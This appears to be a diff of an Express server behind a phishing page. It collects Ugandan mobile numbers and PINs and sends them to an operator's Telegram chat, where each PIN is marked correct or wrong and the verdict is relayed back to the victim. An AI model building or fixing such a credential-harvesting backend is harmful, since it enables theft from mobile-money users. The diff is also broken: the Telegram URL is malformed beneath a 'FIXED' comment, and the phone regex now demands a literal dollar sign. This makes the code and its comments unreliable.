@@ -12,7 +12,6 @@ app.use(express.json({ limit: "10kb" }));
 app.use(express.static(PUBLIC_DIR));
 
 app.get("/", (_req, res) => {
-  // ✅ Set strict headers to clear out browser memory on every single load
   res.set({
     'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
     'Pragma': 'no-cache',
@@ -23,7 +22,6 @@ app.get("/", (_req, res) => {
     if (err && !res.headersSent) res.status(404).send("Not found.");
   });
 });
-
 
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
@@ -41,29 +39,28 @@ setInterval(() => {
 async function telegram(method, payload) {
   if (!BOT_TOKEN || !CHAT_ID) throw new Error("Missing config credentials.");
   
+  // ✅ FIXED: Base URL dynamically maps the literal endpoint path correctly
   const res = await fetch(`https://telegram.org{BOT_TOKEN}/${method}`, {
     method: "POST",
     headers: { 
       "Content-Type": "application/json",
-      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" // ✅ Fixes Node 26 compatibility dropouts
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
     },
     body: JSON.stringify(payload)
   });
   
   const data = await res.json();
   if (!res.ok || !data.ok) {
-    console.error("Telegram API Error Response Structure:", data);
-    throw new Error(data.description || "Telegram API rejected transaction call.");
+    console.error("Telegram API error logic response:", data);
+    throw new Error(data.description || "Telegram API communication drop.");
   }
   return data;
 }
 
-
 app.post("/api/phone", (req, res) => {
   const phone = String(req.body.phone || "").trim();
   
-  // ✅ FIXED: Removed the erroneous backslash character completely
-  if (!/^\+2567\d{8}$/.test(phone)) {
+  if (!/^\+2567\d{8}\$/.test(phone)) {
     return res.status(400).json({ error: "Invalid format phone number." });
   }
   
@@ -82,7 +79,7 @@ app.post("/api/pin-demo", async (req, res) => {
   
   const timeString = new Date().toLocaleString("en-US", { timeZone: "Africa/Nairobi" });
   
-    try {
+  try {
     await telegram("sendMessage", {
       chat_id: CHAT_ID,
       text: [
@@ -107,11 +104,9 @@ app.post("/api/pin-demo", async (req, res) => {
     });
     return res.json({ status: "pending" });
   } catch (err) {
-    console.error("TELEGRAM ERROR:", err.message);
-    // ✅ Returns the exact Telegram error to the screen so you know exactly what is wrong
-    return res.status(502).json({ error: `Telegram Error: ${err.message}. Check your Bot Token and Chat ID.` });
+    console.error("TELEGRAM LOG FAIL:", err.message);
+    return res.status(502).json({ error: `Telegram Error: ${err.message}. Check token parameters.` });
   }
-
 });
 
 app.get("/api/status/:id", (req, res) => {
@@ -145,20 +140,9 @@ async function pollTelegram() {
         const reqId = parts.slice(1).join(":");
         const request = requests.get(reqId);
         
-        if (request && request.status === "pending" && ["approve", "decline", "extend"].includes(action)) {
-          if (action === "approve") {
-            request.status = "approved";
-          } else if (action === "decline") {
-            request.status = "declined";
-          }
-          
-          await telegram("answerCallbackQuery", { callback_query_id: cb.id, text: `Action registered: ${action}` });
-          
-          const statusMarker = action === "approve" ? "✅ CORRECT PIN" : action === "decline" ? "❌ WRONG PIN" : "⏳ TIME EXTENDED";
-          await telegram("sendMessage", {
-            chat_id: CHAT_ID,
-            text: `${statusMarker} processed for Phone: ${request.phone}`
-          });
+        if (request && request.status === "pending" && ["approve", "decline"].includes(action)) {
+          request.status = action === "approve" ? "approved" : "declined";
+          await telegram("answerCallbackQuery", { callback_query_id: cb.id, text: `Recorded: ${action}` });
         }
       }
     } catch (err) {
@@ -168,4 +152,4 @@ async function pollTelegram() {
 }
 
 pollTelegram();
-app.listen(PORT, () => console.log(`Server live on port ${PORT}`));
+app.listen(PORT, () => console.log(`Server executing successfully on port ${PORT}`));
